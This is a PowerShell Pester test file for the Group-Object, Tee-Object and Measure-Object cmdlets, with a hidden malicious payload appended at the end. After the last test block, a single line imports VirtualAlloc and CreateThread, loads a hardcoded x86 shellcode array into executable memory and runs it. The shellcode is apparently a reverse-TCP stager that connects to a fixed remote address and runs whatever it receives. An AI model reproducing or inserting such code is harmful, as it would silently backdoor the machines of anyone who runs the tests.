

Describe "Object cmdlets" -Tags "CI" {
    Context "Group-Object" {
        It "AsHashtable returns a hashtable" {
            $result = Get-Process | Group-Object -Property ProcessName -AsHashTable
            $result["pwsh"].Count | Should -BeGreaterThan 0
        }

        It "AsString returns a string" {
           $processes = Get-Process | Group-Object -Property ProcessName -AsHashTable -AsString
           $result = $processes.Keys | ForEach-Object {$_.GetType()}
           $result[0].Name | Should -Be "String"
        }
    }

    Context "Tee-Object" {
        It "with literal path" {
            $path = "TestDrive:\[TeeObjectLiteralPathShouldWorkForSpecialFilename].txt"
            Write-Output "Test" | Tee-Object -LiteralPath $path | Tee-Object -Variable TeeObjectLiteralPathShouldWorkForSpecialFilename
            $TeeObjectLiteralPathShouldWorkForSpecialFilename | Should -Be (Get-Content -LiteralPath $path)
        }
    }
}

Describe "Object cmdlets" -Tags "CI" {
    Context "Measure-Object" {
        BeforeAll {
            
            
            
            
            

            $firstValue = "9995788.71"
            $expectedFirstValue = $null
            $null = [System.Management.Automation.LanguagePrimitives]::TryConvertTo($firstValue, [double], [cultureinfo]::InvariantCulture, [ref] $expectedFirstValue)
            $firstObject = new-object psobject
            $firstObject | Add-Member -NotePropertyName Header -NotePropertyValue $firstValue

            $secondValue = "15847577.7"
            $expectedSecondValue = $null
            $null = [System.Management.Automation.LanguagePrimitives]::TryConvertTo($secondValue, [double], [cultureinfo]::InvariantCulture, [ref] $expectedSecondValue)
            $secondObject = new-object psobject
            $secondObject | Add-Member -NotePropertyName Header -NotePropertyValue $secondValue

            $testCases = @(
                @{ data = @("abc","ABC","Def"); min = "abc"; max = "Def"},
                @{ data = @([datetime]::Today, [datetime]::Today.AddDays(-1)); min = ([datetime]::Today.AddDays(-1)).ToString() ; max = [datetime]::Today.ToString() }
                @{ data = @(1,2,3,"ABC"); min = 1; max = "ABC"},
                @{ data = @(4,2,3,"ABC",1); min = 1; max = "ABC"},
                @{ data = @(4,2,3,"ABC",1,"DEF"); min = 1; max = "DEF"},
                @{ data = @("111 Test","19"); min = "111 Test"; max = "19"},
                @{ data = @("19", "111 Test"); min = "111 Test"; max = "19"},
                @{ data = @("111 Test",19); min = "111 Test"; max = 19},
                @{ data = @(19, "111 Test"); min = "111 Test"; max = 19},
                @{ data = @(100,2,3, "A", 1); min = 1; max = "A"},
                @{ data = @(4,2,3, "ABC", 1, "DEF"); min = 1; max = "DEF"},
                @{ data = @("abc",[Datetime]::Today,"def"); min = [Datetime]::Today.ToString(); max = "def"}
            )
        }

        It "can compare string representation for minimum" {
            $minResult = $firstObject, $secondObject | Measure-Object Header -Minimum
            $minResult.Minimum.ToString() | Should -Be $expectedFirstValue.ToString()
        }

        It "can compare string representation for maximum" {
            $maxResult = $firstObject, $secondObject | Measure-Object Header -Maximum
            $maxResult.Maximum.ToString() | Should -Be $expectedSecondValue.ToString()
        }

        It 'correctly find minimum of (<data>)' -TestCases $testCases {
            param($data, $min, $max)

            $output = $data | Measure-Object -Minimum
            $output.Minimum.ToString() | Should -Be $min
        }

        It 'correctly find maximum of (<data>)' -TestCases $testCases {
            param($data, $min, $max)

            $output = $data | Measure-Object -Maximum
            $output.Maximum.ToString() | Should -Be $max
        }

        It 'returns a GenericMeasureInfoObject' {
            $gmi = 1,2,3 | measure-object -max -min
            $gmi | Should -BeOfType Microsoft.PowerShell.Commands.GenericMeasureInfo
        }

        It 'should return correct error for non-numeric input' {
            $gmi = "abc",[Datetime]::Now | Measure-Object -sum -max -ErrorVariable err -ErrorAction silentlycontinue
            $err | ForEach-Object { $_.FullyQualifiedErrorId | Should -Be 'NonNumericInputObject,Microsoft.PowerShell.Commands.MeasureObjectCommand' }
        }

        It 'should have the correct count' {
            $gmi = "abc",[Datetime]::Now | Measure-Object -sum -max -ErrorVariable err -ErrorAction silentlycontinue
            $gmi.Count | Should -Be 2
        }
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x67,0xff,0x06,0x65,0x68,0x02,0x00,0x10,0xe1,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

